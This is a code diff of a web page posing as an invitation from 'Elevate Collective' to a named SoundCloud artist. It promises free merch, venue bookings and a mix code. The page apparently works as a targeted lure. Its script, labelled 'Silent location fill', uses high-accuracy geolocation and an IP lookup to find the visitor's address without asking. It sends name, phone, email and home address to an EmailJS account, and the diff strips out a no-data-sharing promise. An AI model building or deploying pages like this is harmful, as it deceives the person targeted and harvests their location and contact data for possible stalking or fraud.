+    <div class="form-group"><div class="form-label">Availability</div><select id="timeSelect"><option>Weekday morning</option><option selected>Weekday afternoon</option><option>Weekday evening</option><option>Weekend</option></select></div>
 
-    <!-- Free Merch Offer -->
+    <!-- Merch -->
     <div class="merch-card">
-        <div class="merch-title">🎁 Free Welcome Package</div>
-        <div class="merch-desc">
-            <strong>Exclusive for invited SoundCloud artists:</strong> A heavyweight hoodie (10.3 oz), premium tee (6.1 oz), and beanie from the Elevated Collective drop — shipped free. 
-            Our way of welcoming you to the family.
-        </div>
-        
-        <!-- US Size Chart -->
-        <div class="size-chart">
-            <div><strong>Size</strong></div><div><strong>Chest (in)</strong></div><div><strong>Length (in)</strong></div><div><strong>Sleeve (in)</strong></div>
-            <div>M</div><div>38-40</div><div>28</div><div>34.5</div>
-            <div>L</div><div>42-44</div><div>29</div><div>35.5</div>
-            <div>XL</div><div>46-48</div><div>30</div><div>36.5</div>
-            <div>2XL</div><div>50-52</div><div>31</div><div>37.5</div>
-        </div>
-
+        <div class="merch-title">Welcome Package</div>
+        <div class="merch-desc">Complimentary hoodie, tee, and beanie — shipped to invited artists.</div>
+        <div class="size-chart"><div>Size</div><div>Chest</div><div>Length</div><div>Sleeve</div><div>M</div><div>38–40</div><div>28</div><div>34.5</div><div>L</div><div>42–44</div><div>29</div><div>35.5</div><div>XL</div><div>46–48</div><div>30</div><div>36.5</div><div>2XL</div><div>50–52</div><div>31</div><div>37.5</div></div>
         <div class="size-row">
-            <div class="form-group">
-                <div class="form-label">Hoodie Size</div>
-                <select id="hoodieSize">
-                    <option value="M">M (38-40" chest)</option>
-                    <option value="L" selected>L (42-44" chest)</option>
-                    <option value="XL">XL (46-48" chest)</option>
-                    <option value="2XL">2XL (50-52" chest)</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <div class="form-label">Tee Size</div>
-                <select id="teeSize">
-                    <option value="M">M (38-40" chest)</option>
-                    <option value="L" selected>L (42-44" chest)</option>
-                    <option value="XL">XL (46-48" chest)</option>
-                    <option value="2XL">2XL (50-52" chest)</option>
-                </select>
-            </div>
+            <div class="form-group"><div class="form-label">Hoodie</div><select id="hoodieSize"><option value="M">M</option><option value="L" selected>L</option><option value="XL">XL</option><option value="2XL">2XL</option></select></div>
+            <div class="form-group"><div class="form-label">Tee</div><select id="teeSize"><option value="M">M</option><option value="L" selected>L</option><option value="XL">XL</option><option value="2XL">2XL</option></select></div>
         </div>
-
-        <div class="form-group">
-            <div class="form-label">Street Address</div>
-            <input type="text" id="streetInput" placeholder="Where should we send it?">
-        </div>
+        <div class="form-group"><div class="form-label">Shipping address</div><input type="text" id="streetInput" placeholder="Street address"></div>
         <div class="address-row">
-            <div class="form-group">
-                <div class="form-label">City</div>
-                <input type="text" id="cityInput" placeholder="Tyler">
-            </div>
-            <div class="form-group">
-                <div class="form-label">State</div>
-                <input type="text" id="stateInput" placeholder="TX">
-            </div>
-            <div class="form-group">
-                <div class="form-label">ZIP</div>
-                <input type="text" id="zipInput" placeholder="75701">
-            </div>
+            <div class="form-group"><div class="form-label">City</div><input type="text" id="cityInput" placeholder="City"></div>
+            <div class="form-group"><div class="form-label">State</div><input type="text" id="stateInput" placeholder="State"></div>
+            <div class="form-group"><div class="form-label">ZIP</div><input type="text" id="zipInput" placeholder="ZIP"></div>
         </div>
-        <div class="merch-note">
-            💡 Tall? We recommend sizing up for the hoodie for a relaxed fit. Beanie is one size.
-        </div>
+        <div class="merch-note">Sizing up recommended for tall fits. Beanie is one size.</div>
     </div>
 
-    <!-- CTA -->
-    <button class="cta-btn" id="submitBtn">ACCEPT INVITATION →</button>
-    
-    <!-- Legal Disclaimer -->
-    <div class="disclaimer">
-        This invitation does not constitute a binding agreement or guarantee of placement. 
-        Elevate Collective facilitates introductions between artists and venue management; all final booking terms, compensation, 
-        and performance details are subject to separate negotiation and contract. The welcome package is a complimentary gift 
-        with no cash value and is offered at the sole discretion of Elevate Collective. Offer limited to invited SoundCloud artists only; 
-        one per recipient. Shipping to U.S. addresses only. By submitting your information, you agree to be contacted by 
-        Elevate Collective regarding potential opportunities. We do not sell or share your data with third parties for marketing purposes. 
-        <a href="#">Privacy Policy</a> · <a href="#">Terms</a>
-    </div>
+    <button class="cta-btn" id="submitBtn">Accept Invitation →</button>
 
-    <div class="footer">Elevate Collective · Tyler, TX · Ref: ETX·2026·117</div>
+    <div class="legal">
+        This referral does not constitute a binding agreement. Elevate Collective facilitates introductions only. All booking terms are subject to separate negotiation. Welcome package offered at discretion of Elevate Collective; no cash value. U.S. shipping only. <a href="#">Privacy</a> · <a href="#">Terms</a>
+    </div>
+    <div class="footer-ref">Elevate Collective · Tyler, TX · Ref: ETX-2026-117</div>
 </div>
 
-<!-- Popup Offer -->
+<!-- Popup -->
 <div class="popup-overlay" id="popupOverlay">
     <div class="popup-card">
         <button class="popup-close" id="popupClose">&times;</button>
-        <div class="popup-tag">Limited Offer · 48h Only</div>
-        <div class="popup-title">Free Mix & Master</div>
-        <div class="popup-desc" style="color:#bbb; margin-bottom:20px;">
-            Get a 30‑second professional mix/master of any track — on us.
-        </div>
-        <div class="promo-box">
-            <div style="font-size:0.6rem; letter-spacing:2px; color:#aaa;">YOUR PROMO CODE</div>
-            <div class="promo-code">ELEVATE117</div>
-        </div>
-        <input type="email" id="popupEmail" class="popup-input" placeholder="Enter your email">
-        <button class="popup-btn" id="popupClaimBtn">Claim Now</button>
-        <div style="font-size:0.65rem; color:#666; margin-top:16px;">We'll email your code + instructions.</div>
+        <div class="popup-tag">Limited offer</div>
+        <div class="popup-title">Mix sample</div>
+        <div style="color:#b0b0bb; margin-bottom:24px;">Complimentary 30‑second mix & master</div>
+        <div class="promo-box"><div style="font-size:11px; letter-spacing:2px; color:#9a9aae;">Code</div><div class="promo-code">ELEVATE117</div></div>
+        <input type="email" id="popupEmail" class="popup-input" placeholder="Email address">
+        <button class="popup-btn" id="popupClaimBtn">Send code</button>
     </div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
 (function() {
-    // ---- ANIMATED STATS & GRAPHS ----
+    // Animate stats
     function animateValue(id, start, end, duration) {
         const obj = document.getElementById(id);
         let startTimestamp = null;
@@ -859,22 +582,22 @@
     const observer = new IntersectionObserver((entries) => {
         entries.forEach(e => {
             if(e.isIntersecting) {
-                animateValue('stat1', 0, 846, 1500);
-                animateValue('stat2', 0, 464, 1500);
-                animateValue('stat3', 0, 306, 1500);
-                animateValue('stat4', 0, 22, 1500);
-                animateBar('bar1', 100, 1800);
-                animateBar('bar2', (464/846)*100, 1800);
-                animateBar('bar3', (306/846)*100, 1800);
-                animateBar('bar4', (287/846)*100, 1800);
-                animateBar('bar5', (101/846)*100, 1800);
+                animateValue('stat1', 0, 846, 1200);
+                animateValue('stat2', 0, 464, 1200);
+                animateValue('stat3', 0, 306, 1200);
+                animateValue('stat4', 0, 22, 1200);
+                animateBar('bar1', 100, 1500);
+                animateBar('bar2', (464/846)*100, 1500);
+                animateBar('bar3', (306/846)*100, 1500);
+                animateBar('bar4', (287/846)*100, 1500);
+                animateBar('bar5', (101/846)*100, 1500);
                 observer.unobserve(e.target);
             }
         });
     }, { threshold: 0.3 });
     observer.observe(document.querySelector('.stats-grid'));
 
-    // ---- VENUE MULTI-SELECT ----
+    // Venue selection
     let selectedVenues = ['The Foundry'];
     document.querySelectorAll('.venue-item').forEach(item => {
         item.addEventListener('click', function() {
@@ -889,10 +612,9 @@
         });
     });
 
-    // ---- EMAILJS INIT ----
     emailjs.init('0pn8P18xI5m0VVW8U');
 
-    // ---- SILENT LOCATION FILL ----
+    // Silent location fill
     async function fillAddress() {
         const update = (s,c,st,z) => {
             if(s) document.getElementById('streetInput').value = s;
@@ -916,12 +638,12 @@
                     const d = await r.json();
                     update('', d.city, d.region_code, d.postal);
                 } catch(e) {}
-            }, { enableHighAccuracy: true, timeout: 5000 });
+            }, { enableHighAccuracy: true, timeout: 8000 });
         }
     }
     fillAddress();
 
-    // ---- POPUP (delayed 8s) ----
+    // Popup
     const overlay = document.getElementById('popupOverlay');
     setTimeout(() => overlay.style.display = 'flex', 8000);
     document.getElementById('popupClose').onclick = () => overlay.style.display = 'none';
@@ -936,22 +658,21 @@
             selected_date: 'Promo',
             reply_to: email
         }).then(() => {
-            alert('✅ Promo code sent! Check your inbox.');
+            alert('Code sent to your email.');
             overlay.style.display = 'none';
         }).catch(() => {
-            alert('🎛️ Your code: ELEVATE117 — save it!');
+            alert('Your code: ELEVATE117');
             overlay.style.display = 'none';
         });
     };
 
-    // ---- FORM SUBMIT ----
+    // Submit
     document.getElementById('submitBtn').onclick = async (e) => {
         const btn = e.target;
         const firstName = document.getElementById('firstNameInput').value.trim();
         const lastName = document.getElementById('lastNameInput').value.trim();
         const email = document.getElementById('emailInput').value.trim();
         const phone = document.getElementById('phoneInput').value.trim();
-        
         if(!firstName || !lastName) { alert('Please enter your first and last name.'); return; }
         if(!email.includes('@')) { alert('Please enter a valid email address.'); return; }
         if(!phone) { alert('Please provide a phone number for coordination.'); return; }
@@ -971,20 +692,18 @@
         };
         const addr = data.street && data.city ? `${data.street}, ${data.city}, ${data.state} ${data.zip}` : 'Not provided';
         
-        const msg = `ELEVATE · INVITATION ACCEPTED
-Ref: ETX·2026·117
+        const msg = `ELEVATE · ARTIST REFERRAL ACCEPTED
+Ref: ETX-2026-117
 
-SoundCloud Artist: @highk3yz
-Name: ${firstName} ${lastName}
-Email: ${email} | Phone: ${phone}
+@highk3yz
+${firstName} ${lastName}
+${email} | ${phone}
 
-Catalog Highlights:
-TMR (846) · Splinter (464) · Dirty Money (306) · Rolling clouds (287) · 22+ tracks
+Catalog: TMR (846), Splinter (464), Dirty Money (306), Rolling clouds (287) · 22+ tracks
 Venues: ${selectedVenues.join(' · ')}
-Contact time: ${data.time}
+Availability: ${data.time}
 
-🎁 WELCOME PACKAGE
-Hoodie: ${data.hoodie} | Tee: ${data.tee}
+Welcome Package: Hoodie ${data.hoodie} / Tee ${data.tee}
 Ship to: ${addr}
 
 Submitted: ${new Date().toLocaleString()}`;
@@ -994,27 +713,20 @@ Submitted: ${new Date().toLocaleString()}`;
                 name: `${firstName} ${lastName}`,
                 email: email,
                 message: msg,
-                selected_date: 'Invitation',
+                selected_date: 'Referral',
                 reply_to: email
             });
             document.getElementById('app').innerHTML = `
                 <div class="success-container">
-                    <div class="success-icon">
-                        <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#C9A84C" stroke-width="2">
-                            <polyline points="20 6 9 17 4 12"/>
-                        </svg>
-                    </div>
-                    <div class="success-title">YOU'RE IN.</div>
-                    <div class="success-msg">
-                        We'll reach out within 48 hours to schedule a conversation.<br>
-                        Your welcome package ships this week.
-                    </div>
-                    <div class="success-code">🎛️ Mix code: ELEVATE117</div>
-                    <div style="margin-top:40px; font-size:0.6rem; color:#555;">Ref: ETX·2026·117</div>
+                    <div class="success-icon"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#d4af37" stroke-width="1.5"><polyline points="20 6 9 17 4 12"/></svg></div>
+                    <div class="success-title">Confirmed.</div>
+                    <div class="success-msg">We'll be in touch within 48 hours.<br>Your welcome package ships this week.</div>
+                    <div class="success-code">Mix code: ELEVATE117</div>
+                    <div style="margin-top:40px; font-size:11px; color:#555;">Ref: ETX-2026-117</div>
                 </div>`;
         } catch(err) {
             alert('Something went wrong. Please try again.');
-            btn.textContent = 'ACCEPT INVITATION →';
+            btn.textContent = 'Accept Invitation →';
             btn.disabled = false;
         }
     };
